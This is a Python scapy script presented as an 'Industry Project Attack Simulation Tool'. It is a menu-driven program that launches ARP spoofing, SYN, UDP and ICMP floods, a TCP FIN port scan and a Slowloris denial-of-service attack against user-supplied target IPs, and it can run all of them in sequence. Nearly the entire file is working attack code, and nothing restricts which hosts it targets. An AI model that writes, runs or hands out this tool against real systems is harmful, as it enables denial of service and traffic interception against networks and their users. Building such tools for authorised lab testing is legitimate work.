#!/usr/bin/env python3

from scapy.all import *
import os
import time
import random
import socket
import threading
import json
import sys

CONFIG_FILE = "attack_config.json"

if os.geteuid() != 0:
    print("[-] Script must be run as root.")
    sys.exit(1)

conf.verb = 0

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

def clear_config():
    if os.path.exists(CONFIG_FILE):
        os.remove(CONFIG_FILE)
        print("[+] Configuration cleared.")
    else:
        print("[-] No config file to remove.")
    input("Press Enter to return to menu...")

config = load_config()

def get_or_prompt(key, prompt, cast=str, default=None):
    if key in current_config:
        return current_config[key]
    val = input(f"{prompt} {'(default: ' + str(default) + ')' if default else ''}: ")
    return cast(val) if val else default

# Attack functions

# ARP Spoof
def arp_spoof(target_ip, spoof_ip, iface):
    target_mac = getmacbyip(target_ip)
    if not target_mac:
        print(f"[-] Failed to get MAC address for {target_ip}")
        return
    print(f"[+] Starting ARP spoof: {target_ip} ← {spoof_ip}")
    try:
        while True:
            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
            sendp(packet, iface=iface)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[!] ARP spoof stopped.")

def syn_flood(target_ip, target_port, duration=10):
    print(f"[+] Launching SYN Flood on {target_ip}:{target_port} for {duration}s")
    end_time = time.time() + duration
    try:
        while time.time() < end_time:
            sport = random.randint(1024, 65535)
            seq = random.randint(0, 4294967295)
            window = random.randint(1000, 5000)
            ip = IP(dst=target_ip)
            tcp = TCP(sport=sport, dport=target_port, flags="S", seq=seq, window=window)
            send(ip/tcp, verbose=0)
    except KeyboardInterrupt:
        print("[!] SYN flood stopped.")

def udp_flood(target_ip, target_port, duration=10, packet_size=1024):
    end_time = time.time() + duration
    payload = Raw(load='A' * packet_size)
    packet = IP(dst=target_ip)/UDP(dport=target_port)/payload
    print(f"[+] Launching UDP Flood on {target_ip}:{target_port} for {duration}s")
    try:
        while time.time() < end_time:
            send(packet, verbose=0)
    except KeyboardInterrupt:
        print("[!] UDP flood stopped.")

def icmp_flood(target_ip, duration=10, interval=0.01):
    end_time = time.time() + duration
    packet = IP(dst=target_ip)/ICMP()
    print(f"[+] Launching ICMP Flood on {target_ip} for {duration}s")
    try:
        while time.time() < end_time:
            send(packet, verbose=0)
            time.sleep(interval)
    except KeyboardInterrupt:
        print("[!] ICMP flood stopped.")

def tcp_fin_scan(target_ip, port_start=1, port_end=1000):
    print(f"[+] Performing TCP FIN scan on {target_ip} ports {port_start}-{port_end}")
    try:
        for port in range(port_start, port_end + 1):
            packet = IP(dst=target_ip)/TCP(dport=port, flags="F")
            response = sr1(packet, timeout=0.5, verbose=0)
            if response is None:
                print(f"[OPEN/FILTERED] Port {port}")
    except KeyboardInterrupt:
        print("[!] TCP FIN scan stopped.")

def slowloris_attack(target_ip, target_port=80, sockets_count=100, interval=10):
    sockets = []
    print(f"[+] Starting Slowloris attack on {target_ip}:{target_port}")
    try:
        for _ in range(sockets_count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target_ip, target_port))
                s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode("utf-8"))
                s.send("User-Agent: Slowloris\r\n".encode("utf-8"))
                s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
                sockets.append(s)
            except socket.error:
                break
        while True:
            for s in list(sockets):
                try:
                    s.send("X-a: keep-alive\r\n".encode("utf-8"))
                except socket.error:
                    sockets.remove(s)
            time.sleep(interval)
    except KeyboardInterrupt:
        print("[!] Slowloris attack stopped.")

# Main menu
def main():
    global current_config
    while True:
        os.system("clear")
        print("=== Industry Project Attack Simulation Tool ===")
        print("1. ARP Spoof")
        print("2. SYN Flood")
        print("3. UDP Flood")
        print("4. ICMP Flood")
        print("5. TCP FIN Scan")
        print("6. Slowloris Attack")
        print("8. Run All Attacks Sequentially")
        print("9. Clear Config")
        print("0. Exit")
        choice = input("Select an attack: ")

        if choice == "1":
            current_config = config.get("arp_spoof", {})
            target = get_or_prompt("target_ip", "Target IP")
            spoof_ip = get_or_prompt("spoof_ip", "IP to spoof (e.g. gateway)")
            iface = get_or_prompt("iface", "Interface (e.g. eth0)")
            config["arp_spoof"] = {"target_ip": target, "spoof_ip": spoof_ip, "iface": iface}
            save_config(config)
            threading.Thread(target=arp_spoof, args=(target, spoof_ip, iface), daemon=True).start()
            input("Press Enter to return to menu...")

        elif choice == "2":
            current_config = config.get("syn_flood", {})
            target = get_or_prompt("target_ip", "Target IP")
            port = int(get_or_prompt("target_port", "Target Port", int))
            duration = int(get_or_prompt("duration", "Duration (seconds)", int, 10))
            config["syn_flood"] = {"target_ip": target, "target_port": port, "duration": duration}
            save_config(config)
            syn_flood(target, port, duration)
            input("Press Enter to return to menu...")

        elif choice == "3":
            current_config = config.get("udp_flood", {})
            target = get_or_prompt("target_ip", "Target IP")
            port = int(get_or_prompt("target_port", "Target Port", int))
            duration = int(get_or_prompt("duration", "Duration (seconds)", int, 10))
            size = int(get_or_prompt("packet_size", "Packet size (bytes)", int, 1024))
            config["udp_flood"] = {"target_ip": target, "target_port": port, "duration": duration, "packet_size": size}
            save_config(config)
            udp_flood(target, port, duration, size)
            input("Press Enter to return to menu...")

        elif choice == "4":
            current_config = config.get("icmp_flood", {})
            target = get_or_prompt("target_ip", "Target IP")
            duration = int(get_or_prompt("duration", "Duration (seconds)", int, 10))
            interval = float(get_or_prompt("interval", "Interval between packets (seconds)", float, 0.01))
            config["icmp_flood"] = {"target_ip": target, "duration": duration, "interval": interval}
            save_config(config)
            icmp_flood(target, duration, interval)
            input("Press Enter to return to menu...")

        elif choice == "5":
            current_config = config.get("tcp_fin_scan", {})
            target = get_or_prompt("target_ip", "Target IP")
            port_start = int(get_or_prompt("port_start", "Start port", int, 1))
            port_end = int(get_or_prompt("port_end", "End port", int, 100))
            config["tcp_fin_scan"] = {"target_ip": target, "port_start": port_start, "port_end": port_end}
            save_config(config)
            tcp_fin_scan(target, port_start, port_end)
            input("Press Enter to return to menu...")

        elif choice == "6":
            current_config = config.get("slowloris", {})
            target = get_or_prompt("target_ip", "Target IP")
            port = int(get_or_prompt("target_port", "Target Port (default 80)", int, 80))
            sockets_count = int(get_or_prompt("sockets_count", "Number of connections", int, 100))
            interval = int(get_or_prompt("interval", "Keep-alive interval (sec)", int, 10))
            config["slowloris"] = {
                "target_ip": target,
                "target_port": port,
                "sockets_count": sockets_count,
                "interval": interval
            }
            save_config(config)
            slowloris_attack(target, port, sockets_count, interval)
            input("Press Enter to return to menu...")

        elif choice == "8":
            print("[*] Running all attacks sequentially...")

            # ARP Spoof
            current_config = config.get("arp_spoof", {})
            target = get_or_prompt("target_ip", "ARP Spoof Target IP")
            spoof_ip = get_or_prompt("spoof_ip", "IP to spoof (e.g. gateway)")
            iface = get_or_prompt("iface", "Interface (e.g. eth0)")
            config["arp_spoof"] = {"target_ip": target, "spoof_ip": spoof_ip, "iface": iface}
            save_config(config)
            arp_thread = threading.Thread(target=arp_spoof, args=(target, spoof_ip, iface), daemon=True)
            arp_thread.start()

            # SYN Flood
            current_config = config.get("syn_flood", {})
            target = get_or_prompt("target_ip", "SYN Flood Target IP")
            port = int(get_or_prompt("target_port", "SYN Target Port", int))
            duration = int(get_or_prompt("duration", "SYN Duration (s)", int, 10))
            syn_flood(target, port, duration)

            # UDP Flood
            current_config = config.get("udp_flood", {})
            target = get_or_prompt("target_ip", "UDP Flood Target IP")
            port = int(get_or_prompt("target_port", "UDP Target Port", int))
            duration = int(get_or_prompt("duration", "UDP Duration (s)", int, 10))
            size = int(get_or_prompt("packet_size", "UDP Packet size (bytes)", int, 1024))
            udp_flood(target, port, duration, size)

            # ICMP Flood
            current_config = config.get("icmp_flood", {})
            target = get_or_prompt("target_ip", "ICMP Target IP")
            duration = int(get_or_prompt("duration", "ICMP Duration (s)", int, 10))
            interval = float(get_or_prompt("interval", "ICMP Interval (s)", float, 0.01))
            icmp_flood(target, duration, interval)

            # TCP FIN Scan
            current_config = config.get("tcp_fin_scan", {})
            target = get_or_prompt("target_ip", "TCP FIN Target IP")
            port_start = int(get_or_prompt("port_start", "Start Port", int, 1))
            port_end = int(get_or_prompt("port_end", "End Port", int, 100))
            tcp_fin_scan(target, port_start, port_end)

            # Slowloris
            current_config = config.get("slowloris", {})
            target = get_or_prompt("target_ip", "Slowloris Target IP")
            port = int(get_or_prompt("target_port", "Target Port", int, 80))
            sockets_count = int(get_or_prompt("sockets_count", "Connections", int, 100))
            interval = int(get_or_prompt("interval", "Interval (s)", int, 10))
            slowloris_attack(target, port, sockets_count, interval)

            input("All attacks complete. Press Enter to return to menu...")

        elif choice == "9":
            clear_config()
            config.clear()

        elif choice == "0":
            print("Exiting.")
            break
        else:
            input("Invalid choice. Press Enter to try again.")

if __name__ == "__main__":
    main()
